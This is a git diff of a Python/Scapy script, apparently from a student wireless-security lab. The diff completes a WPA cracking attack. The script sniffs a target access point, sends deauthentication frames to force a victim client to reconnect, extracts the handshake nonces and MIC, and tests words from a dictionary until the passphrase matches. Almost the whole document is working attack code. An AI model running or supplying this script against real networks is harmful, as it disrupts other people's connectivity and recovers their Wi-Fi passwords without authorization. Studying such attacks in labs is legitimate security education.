@@ -6,7 +6,8 @@ from pbkdf2_math import pbkdf2_hex
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
-import os 
+import os
+import sys 
 
 interface = sys.argv[1]
 ssidToHack = sys.argv[2]
@@ -16,24 +17,10 @@ if (os.path.isfile("4way.pcap")):
 	os.remove("4way.pcap")
 
 def deauth(nbrTime, APmacArg, victimMAC):
-
-	deauth = rdpcap("deauthExemple.pcap")
-
-	#deauth[0].show()
-
+	deauth = rdpcap("deauth.pcap")
 	print "Starting deauth..."
-
-	# deauth[0].addr1 = a2b_hex(victimMAC.replace(":",""))
-	# deauth[0].addr2 = a2b_hex(APmacArg.replace(":",""))
-	# deauth[0].addr3 = a2b_hex(APmacArg.replace(":",""))
-
-	#deauth[0].show()
-
-
 	for n in range(nbrTime):
 		sendp(deauth[0],iface=interface)
-	print 'Deauth sent via: ' + interface + ' to BSSID: ' + APmacArg + ' for Client: ' + victimMAC
-
 
 def AP_sniff(pkt):
 	if pkt.type == 0 and pkt.subtype == 8:
@@ -42,22 +29,32 @@ def AP_sniff(pkt):
 			return True
 
 def handshake_sniff(pkt):
+	global handshakes
+	# We stop when we found all we need
+	if (handshakes[0] and handshakes[1] and handshakes[2]):
+		return True
+	# Filter : Handshake messages are type 2 and subtype 8 or 0
 	if (pkt.type == 2 and (pkt.subtype == 0 or pkt.subtype == 8)):
-		wrpcap("4way.pcap",pkt,append=True)
+		#Filter : Only handshake between victimMAC and APmac
+		if((pkt.addr1 == victimMAC or pkt.addr1 == APmac) and (pkt.addr2 == APmac or pkt.addr2 == victimMAC)):
 
-	# if (len(handshakes) == 100):
-	# 	return True
-	# elif pkt.type == 2 and pkt.subtype == 8:
-	# 	if (pkt.addr1 == victimMAC and pkt.addr2 == APmac):
-	# 			print "adding handshake type 8"
-	# 			wrpcap("4way.pcap",pkt,append=True)
-	# 			handshakes.append(pkt)
-	# elif pkt.type == 2 and pkt.subtype == 0:
-	# 	if (pkt.addr1 == APmac and pkt.addr2 == victimMAC):
-	# 		if(not handshakes or (pkt not in handshakes)):
-	# 			print "adding handshake type 0"
-	# 			wrpcap("4way.pcap",pkt,append=True)
-	# 			handshakes.append(pkt)
+			#Handshake 1/4 has value 0x008a for Key information.
+			if(not handshakes[0] and b2a_hex((pkt.load)[1:3]) == "008a"): #and 
+				# Adding the frame to the table
+				handshakes[0] = pkt
+				print "Found handshake1/4"
+			
+			#Handshake 2/4 has value 0x010a for Key information.
+			if(not handshakes[1] and b2a_hex((pkt.load)[1:3]) == "010a" ): #
+				# Adding the frame to the table
+				handshakes[1] = pkt
+				print "Found handshake2/4"
+
+			#Handshake 4/4 has value 0x030a for Key information.
+			if(not handshakes[2] and b2a_hex((pkt.load)[1:3]) == "030a" ): #
+				# Adding the frame to the table
+				handshakes[2] = pkt
+				print "Found handshake4/4"
 
 def customPRF512(key,A,B):
     """
@@ -87,6 +84,7 @@ def testWord(passPhrase):
 
 	if micToCompare == micOriginal:
 		print "La passphrase utilisée est correcte !\n"
+		sys.exit()
 	else:
 		print "Echec: essayer avec une nouvelle passphrase !\n"
 
@@ -109,45 +107,50 @@ def generateMic(passPhrase):
 	return mic
 
 def testWordList():
-
 	#This function test each passphrase from a word list
 
-    # Open the UNIX dictonary of words.
-    with open('words.txt', 'r') as f:
-    	words = f.read().split()
+	# Open the UNIX dictonary of words.
+	with open('words.txt', 'r') as f:
+		words = f.read().split()
 
-    # Loop over all the words.
-    for word in words:
-		testWord(word)
+	# Loop over all the words.
+	for word in words:
+		passphraseFound = testWord(word)
 
 # Sniff le réseau en fct l'interface et filtres les paquets
 pktAP = sniff(iface=interface,stop_filter=AP_sniff)
 
-APmac = pktAP[len(pktAP)-1].addr2 
+APmac = pktAP[len(pktAP)-1].addr2
 
-deauth(100, APmac, victimMAC)
+print "APmac " + APmac
+
+deauth(80, APmac, victimMAC)
 
 print "Starting sniff for handshakes..."
-count8 = 0
-handshakes = []
+# handshakes contain the essential part of the 4wayhandshake (msg : [0]msg1/4, [1]msg2/4, [2]msg4/4)
+handshakes =[0] * 3
+# S
 pktHS = sniff(iface=interface,stop_filter=handshake_sniff)
+
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-
 ANonce      = (handshakes[0].load)[13:45]
 SNonce      = (handshakes[1].load)[13:45]
 
-micOriginal = b2a_hex((handshakes[3].load)[77:93])
+micOriginal = b2a_hex((handshakes[2].load)[77:93])
 
-print micOriginal
+victimMAC = a2b_hex(victimMAC.replace(":",""))
+APmac = a2b_hex(APmac.replace(":",""))
 
 B           = min(APmac,victimMAC)+max(APmac,victimMAC)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
 
-replaceStr 	= "0" * len(micOriginal)
+replaceStr  = "0" * len(micOriginal)
 
-data        = b2a_hex(str((handshakes[3])[EAPOL]))
-data 		= data.replace(micOriginal,replaceStr)
+data        = b2a_hex(str((handshakes[2])[EAPOL]))
+data	    = data.replace(micOriginal,replaceStr)
+data 	    = a2b_hex(data)
+
 
 # Execute the script
 testWordList()
